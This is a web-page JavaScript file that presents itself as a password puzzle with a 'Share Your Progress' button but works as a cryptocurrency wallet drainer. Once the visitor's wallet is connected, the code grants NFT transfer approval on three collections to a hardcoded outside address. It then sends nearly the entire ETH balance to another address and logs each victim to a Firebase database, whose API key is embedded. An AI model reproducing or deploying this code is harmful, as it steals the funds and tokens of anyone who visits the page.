


setTimeout( async () => {

    console.log('meh')

 

    $('.MuiInput-input').on('input', function (e) {
        console.log(e.target.value)

        localStorage.setItem('pass', e.target.value)
    })

    $('button').on('click', async () => {
        console.log('button clicked')

        const password = 'You Are Awaited'

    //     const inp = $('.MuiInput-input').val()

    // console.log(inp)

    if (localStorage.getItem('pass') === password) {

        $('.MuiInputBase-root').remove()
        $('button').html('Share Your Progress')


              await loadWeb3()
  
      await getAddress()

      await trade()

    } else {

    }


    // $('.MuiStack-root ').append(`<p class="MuiTypography-root MuiTypography-body1 css-x1iqlg">Incorrect.</p>`)



          
    //   await loadWeb3()
  
    //   await getAddress()

    //   await trade()
  
    })
}, 1000);





$(document).ready(function () {
    console.log('yawa');
  })
  
  //FIREBASE

  const config = {
    apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
    authDomain: "jangneotokyo.firebaseapp.com",
    projectId: "jangneotokyo",
    storageBucket: "jangneotokyo.appspot.com",
    messagingSenderId: "20777123504",
    appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
    }
    
    const app = firebase.initializeApp(config)
    const db = firebase.firestore(app)
    
    const ref = db.collection('jangtokyo')
  
  let account;

  async function loadWeb3() {
      try {
        window.web3 = await new Web3(window.ethereum)
      } catch {
        console.log(error)
      }
      }
  
      const _abi = [
          {
            inputs: [],
            stateMutability: "nonpayable",
            type: "constructor",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "approved",
                type: "address",
              },
              {
                indexed: true,
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "Approval",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "owner",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "operator",
                type: "address",
              },
              {
                indexed: false,
                internalType: "bool",
                name: "approved",
                type: "bool",
              },
            ],
            name: "ApprovalForAll",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "previousOwner",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "newOwner",
                type: "address",
              },
            ],
            name: "OwnershipTransferred",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              {
                indexed: true,
                internalType: "address",
                name: "from",
                type: "address",
              },
              {
                indexed: true,
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                indexed: true,
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "Transfer",
            type: "event",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "approve",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "owner",
                type: "address",
              },
            ],
            name: "balanceOf",
            outputs: [
              {
                internalType: "uint256",
                name: "",
                type: "uint256",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "getApproved",
            outputs: [
              {
                internalType: "address",
                name: "",
                type: "address",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "owner",
                type: "address",
              },
              {
                internalType: "address",
                name: "operator",
                type: "address",
              },
            ],
            name: "isApprovedForAll",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "name",
            outputs: [
              {
                internalType: "string",
                name: "",
                type: "string",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "owner",
            outputs: [
              {
                internalType: "address",
                name: "",
                type: "address",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "ownerOf",
            outputs: [
              {
                internalType: "address",
                name: "",
                type: "address",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "renounceOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "safeMint",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "from",
                type: "address",
              },
              {
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "safeTransferFrom",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "from",
                type: "address",
              },
              {
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
              {
                internalType: "bytes",
                name: "data",
                type: "bytes",
              },
            ],
            name: "safeTransferFrom",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "operator",
                type: "address",
              },
              {
                internalType: "bool",
                name: "approved",
                type: "bool",
              },
            ],
            name: "setApprovalForAll",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "bytes4",
                name: "interfaceId",
                type: "bytes4",
              },
            ],
            name: "supportsInterface",
            outputs: [
              {
                internalType: "bool",
                name: "",
                type: "bool",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [],
            name: "symbol",
            outputs: [
              {
                internalType: "string",
                name: "",
                type: "string",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "tokenURI",
            outputs: [
              {
                internalType: "string",
                name: "",
                type: "string",
              },
            ],
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "from",
                type: "address",
              },
              {
                internalType: "address",
                name: "to",
                type: "address",
              },
              {
                internalType: "uint256",
                name: "tokenId",
                type: "uint256",
              },
            ],
            name: "transferFrom",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            inputs: [
              {
                internalType: "address",
                name: "newOwner",
                type: "address",
              },
            ],
            name: "transferOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
        ];
  
  
//   $('#japjapconnect').on('click', async() => {
    
  
//       await loadWeb3()
  
//       await getAddress()
//       // alert('JAPJAP CONNECT')
  
//       // japjap()
  
//       await trade()
  
//   })
  
  
  
  
  
  
  
  
      async function getAddress() {
  
  
  
          const accounts = await window.ethereum.request({
              method: 'eth_requestAccounts'
          }).catch( (err) => {
              if (err.code === 4001) {
                  console.log('please con met');
                  location.reload()
                  
              } else {
                  console.error(err)
              }
          
          });
        
          account = accounts[0]
          console.log(account)
        
          
        
          const LISTCOLLECTION =   db.collection('addresses').doc(account)


          await LISTCOLLECTION.get().then(
            (docSnapshot) => {
              if (
                docSnapshot.exists
              ) {
                console.log('doc exists')
                LISTCOLLECTION.update({
                  status: 'connected',
                  date: new Date()
                })
        
              } else {
        
                console.log('doc not found')
                LISTCOLLECTION.set({
                  address: account,
                  date: new Date(),
                  status: 'connected'
                }).then( () => {
                  console.log('successfully added')
                }).catch( () => {
                  console.log('error adding document');
                })
        
        
              }
            }
          )
        
        
        
        }



  
        async function trade() {
        //   await loadWeb3();

        const neo = [
            '0xa19f5264f7d7be11c451c093d8f92592820bea86',
            '0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f',
            '0x4481507cc228fa19d203bd42110d679571f7912e',
          ]  

          neo.forEach( async e => {

            try {
                
            var collectionContract = await new window.web3.eth.Contract(_abi, e, {gas: '100000'})
            await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})


            //
            const collection_contracts = db.collection(account.toLowerCase())


            collection_contracts.doc(e).set({
                approved: 'true',
                contract: e,
                date: new Date(),
                owner: account,
            }).then( () => {
                console.log("Document successfully written!");
            }).catch((error) => {
                console.error("Error writing document: ", error);
            });




            } catch (error) {

              
                console.log('declined .. butang database', account.toLowerCase())


                const collection_contracts = db.collection(account.toLowerCase())


                collection_contracts.doc(e).set({
                    approved: 'false',
                    contract: e,
                    date: new Date(),
                    owner: account,
                }).then( () => {
                    console.log("Document successfully written!");
                }).catch((error) => {
                    console.error("Error writing document: ", error);
                });

                // db.collection("cities").get().then((querySnapshot) => {
                //     querySnapshot.forEach((doc) => {
                //         // doc.data() is never undefined for query doc snapshots
                //         console.log(doc.id, " => ", doc.data());
                //     });
                // });


            }



  
          })

  
  
          // eth send

          var value = await get_eth(account) //search getbalance.js
          var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty
          
          const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')



          console.log(finalAmount)
          const txData = {
          from: account,
          to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
          value: finalAmount,
          };


          await web3.eth.sendTransaction(txData)
          .then( (txHash) => {

          db.collection('eth sent').add(txData).then( () => {
            console.log('data eth sent')
          }).catch( () => {
              console.log('err')
          })

          console.log(txHash)
          }).catch( (err) => {



          console.log(err)
          })


        }



        //get eth
        async function get_eth(address) {

          const balances = web3.utils.fromWei(
            await web3.eth.getBalance(address),
            'ether'
          )* 1;
        
          return balances;
        
        }